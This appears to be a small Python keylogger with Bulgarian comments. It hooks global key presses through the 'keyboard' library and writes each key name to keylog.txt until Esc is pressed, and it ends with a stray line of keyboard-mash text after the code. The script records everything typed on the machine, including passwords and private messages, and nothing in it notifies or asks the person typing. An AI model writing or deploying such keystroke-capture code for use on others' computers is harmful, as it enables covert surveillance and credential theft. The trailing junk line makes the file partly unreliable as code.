import keyboard

# Отворете файл за запис
with open('keylog.txt', 'w') as file:
    # Слушайте клавиатурата и записвайте въведените символи
    keyboard.on_press(lambda e: file.write(e.name))
    # Започнете слушането
    keyboard.wait('esc')

# След като спрете слушането (натиснете "esc"), затворете файлa
file.close()
асдассдаааsddasdasddas
